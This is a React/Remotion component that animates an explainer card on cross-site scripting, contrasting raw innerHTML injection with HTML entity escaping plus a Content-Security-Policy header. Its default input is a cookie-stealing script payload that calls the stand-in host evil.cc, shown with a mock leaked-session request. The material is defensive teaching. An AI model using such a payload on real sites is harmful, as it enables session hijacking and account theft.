import { interpolateColors, useCurrentFrame } from "remotion";
import { Icon } from "../../icons/Icons";
import { TW, TX, TY } from "../../layout";
import { C, easeInOut, easeOut, materialize, mono, prog, sans, TERM } from "../../theme";
import { DevCard, TAB_H, toneColors } from "../dev/card";
import { GREEN, presence, RED } from "../diagram/Node";
import { tint } from "../windows/MacWindow";

export const XSS_CARD_H = 650;

/**
 * Cross-Site Scripting (XSS) & Content-Security-Policy (CSP) card:
 * shows untrusted user input (`<script>fetch('evil.cc?c='+document.cookie)</script>`),
 * an `unsafe` state where the browser executes the script in red, and a `sanitizeAt`
 * state where HTML entity escaping (`&lt;script&gt;`) + `CSP: script-src 'self'`
 * neutralizes it into harmless plain text in green.
 */
export const XSSPlayground: React.FC<{
  input?: string;
  csp?: string;
  x?: number;
  y?: number;
  w?: number;
  h?: number;
  at: number;
  until?: number;
  unsafeAt?: number;
  sanitizeAt?: number;
  dark?: boolean;
  filename?: string;
}> = ({
  input = "<script>fetch('evil.cc?c='+document.cookie)</script>",
  csp = "CSP: script-src 'self'",
  x = TX,
  y = TY,
  w = TW,
  h = XSS_CARD_H,
  at,
  until,
  unsafeAt,
  sanitizeAt,
  dark = false,
  filename = "comment-renderer.tsx",
}) => {
  const frame = useCurrentFrame();
  const p = presence(frame, at, until);
  if (p === null) return null;

  const execStart = unsafeAt ?? at + 10;
  const execIn = prog(frame, execStart, 10, easeOut);
  const sanP = sanitizeAt !== undefined ? prog(frame, sanitizeAt, 14, easeInOut) : 0;
  const isSanitized = sanP > 0.5;

  const fg = dark ? TERM.fg : C.ink;
  const mute = dark ? TERM.dim : C.mute;
  const lineCol = dark ? "rgba(255,255,255,0.09)" : C.line;

  const badLook = toneColors("bad", dark);
  const goodLook = toneColors("good", dark);

  const mixBg = interpolateColors(sanP, [0, 1], [badLook.bg, goodLook.bg]);
  const mixEdge = interpolateColors(sanP, [0, 1], [badLook.edge, goodLook.edge]);
  const mixFg = interpolateColors(sanP, [0, 1], [badLook.fg, goodLook.fg]);

  const escapedInput = input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

  const rightBadge = (
    <div
      style={{
        height: 38,
        padding: "0 14px",
        borderRadius: 10,
        background: mixBg,
        border: `1.5px solid ${mixEdge}`,
        color: mixFg,
        display: "flex",
        alignItems: "center",
        gap: 8,
        fontFamily: mono,
        fontWeight: 700,
        fontSize: 19,
      }}
    >
      <div style={{ width: 9, height: 9, borderRadius: 5, background: isSanitized ? GREEN : RED }} />
      {isSanitized ? "sanitized + CSP" : "unsafe innerHTML"}
    </div>
  );

  return (
    <DevCard
      x={x}
      y={y}
      w={w}
      h={h}
      p={p}
      dark={dark}
      filename={filename}
      icon={isSanitized ? "shieldCheck" : "bug"}
      right={rightBadge}
    >
      <div
        style={{
          height: h - TAB_H,
          padding: "24px 28px",
          display: "flex",
          flexDirection: "column",
          justifyContent: "space-between",
          boxSizing: "border-box",
        }}
      >
        {/* 1. Untrusted User Input */}
        <div
          style={{
            borderRadius: 18,
            background: dark ? "rgba(255,255,255,0.04)" : "#F7F7FA",
            border: `1px solid ${lineCol}`,
            padding: "16px 22px",
          }}
        >
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              marginBottom: 10,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <Icon name="code" size={22} color={mute} weight={2.1} />
              <span style={{ fontFamily: sans, fontWeight: 600, fontSize: 20, color: mute, letterSpacing: "-0.01em" }}>
                Untrusted user input
              </span>
            </div>
            <span style={{ fontFamily: mono, fontWeight: 500, fontSize: 18, color: mute }}>
              POST /comments · payload
            </span>
          </div>
          <div
            style={{
              fontFamily: mono,
              fontWeight: 700,
              fontSize: 23,
              color: fg,
              background: dark ? TERM.bg : C.white,
              border: `1px solid ${lineCol}`,
              borderRadius: 12,
              padding: "12px 16px",
              whiteSpace: "nowrap",
              overflow: "hidden",
              textOverflow: "ellipsis",
            }}
          >
            <span style={{ color: RED }}>&lt;script&gt;</span>
            <span>fetch(</span>
            <span style={{ color: dark ? TERM.orange : "#C9281E" }}>&apos;evil.cc?c=&apos;</span>
            <span>+document.cookie)</span>
            <span style={{ color: RED }}>&lt;/script&gt;</span>
          </div>
        </div>

        {/* 2. HTML Output Encoding & Content-Security-Policy */}
        <div
          style={{
            borderRadius: 18,
            background: dark ? "rgba(255,255,255,0.04)" : "#F7F7FA",
            border: `1.5px solid ${mixEdge}`,
            padding: "16px 22px",
            position: "relative",
          }}
        >
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              marginBottom: 12,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <Icon name={isSanitized ? "lock" : "unlock"} size={22} color={mixFg} weight={2.1} />
              <span style={{ fontFamily: sans, fontWeight: 600, fontSize: 20, color: fg, letterSpacing: "-0.01em" }}>
                {isSanitized ? "HTML entity escaping + CSP header" : "Raw DOM injection (no escaping)"}
              </span>
            </div>

            {/* CSP Policy Pill */}
            <div
              style={{
                height: 36,
                padding: "0 14px",
                borderRadius: 10,
                background: isSanitized ? tint(GREEN, dark ? 0.2 : 0.14) : tint(RED, dark ? 0.2 : 0.11),
                color: mixFg,
                display: "flex",
                alignItems: "center",
                gap: 8,
                fontFamily: mono,
                fontWeight: 700,
                fontSize: 18,
              }}
            >
              <Icon name={isSanitized ? "shieldCheck" : "warning"} size={19} color={mixFg} weight={2.2} />
              {isSanitized ? csp : "No Content-Security-Policy"}
            </div>
          </div>

          {/* Code / Escaped Representation */}
          <div
            style={{
              fontFamily: mono,
              fontWeight: 600,
              fontSize: 21,
              color: fg,
              background: dark ? TERM.bg : C.white,
              border: `1px solid ${lineCol}`,
              borderRadius: 12,
              padding: "12px 16px",
              whiteSpace: "nowrap",
              overflow: "hidden",
              textOverflow: "ellipsis",
            }}
          >
            {isSanitized ? (
              <span>
                <span
                  style={{
                    background: tint(GREEN, 0.18),
                    color: goodLook.fg,
                    padding: "2px 6px",
                    borderRadius: 6,
                    fontWeight: 700,
                  }}
                >
                  &amp;lt;script&amp;gt;
                </span>
                <span>fetch(&apos;evil.cc?c=&apos;+document.cookie)</span>
                <span
                  style={{
                    background: tint(GREEN, 0.18),
                    color: goodLook.fg,
                    padding: "2px 6px",
                    borderRadius: 6,
                    fontWeight: 700,
                  }}
                >
                  &amp;lt;/script&amp;gt;
                </span>
              </span>
            ) : (
              <span>
                <span style={{ color: mute }}>div.innerHTML = </span>
                <span style={{ color: badLook.fg }}>{input}</span>
              </span>
            )}
          </div>
          {/* Hidden plain text fallback for screen reader / completeness */}
          <span style={{ display: "none" }}>{escapedInput}</span>
        </div>

        {/* 3. Browser Execution Verdict (Unsafe Red -> Neutralized Green) */}
        <div
          style={{
            borderRadius: 20,
            background: mixBg,
            border: `2px solid ${mixEdge}`,
            padding: "18px 24px",
            ...materialize(execIn),
          }}
        >
          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              marginBottom: 12,
            }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <div
                style={{
                  width: 42,
                  height: 42,
                  borderRadius: 12,
                  background: isSanitized ? GREEN : RED,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <Icon name={isSanitized ? "check" : "bug"} size={24} color={C.white} weight={2.4} />
              </div>
              <div>
                <div style={{ fontFamily: sans, fontWeight: 700, fontSize: 24, color: mixFg, letterSpacing: "-0.02em" }}>
                  {isSanitized
                    ? "Neutralized — rendered as harmless plain text"
                    : "XSS executed — browser ran injected <script>"}
                </div>
                <div style={{ fontFamily: mono, fontWeight: 500, fontSize: 18, color: mute }}>
                  {isSanitized
                    ? "TextNode created · inline execution blocked by CSP"
                    : "Session cookie read via document.cookie"}
                </div>
              </div>
            </div>

            <div
              style={{
                height: 40,
                padding: "0 16px",
                borderRadius: 20,
                background: isSanitized ? GREEN : RED,
                color: C.white,
                display: "flex",
                alignItems: "center",
                gap: 8,
                fontFamily: mono,
                fontWeight: 700,
                fontSize: 19,
              }}
            >
              {isSanitized ? "SAFE" : "EXPLOITED"}
            </div>
          </div>

          {/* Browser Output / Network Preview Box */}
          <div
            style={{
              borderRadius: 12,
              background: dark ? TERM.bg : C.white,
              border: `1px solid ${lineCol}`,
              padding: "12px 16px",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              fontFamily: mono,
              fontSize: 20,
            }}
          >
            {isSanitized ? (
              <>
                <div style={{ color: fg, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                  <span style={{ color: mute }}>Comment: </span>
                  <span>&quot;{input}&quot;</span>
                </div>
                <div style={{ color: goodLook.fg, fontWeight: 700, flexShrink: 0, marginLeft: 12 }}>
                  0 scripts run
                </div>
              </>
            ) : (
              <>
                <div style={{ color: badLook.fg, fontWeight: 700, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                  GET https://evil.cc?c=sid=8f92a1e4...
                </div>
                <div style={{ color: badLook.fg, fontWeight: 700, flexShrink: 0, marginLeft: 12 }}>
                  200 OK (leaked)
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    </DevCard>
  );
};
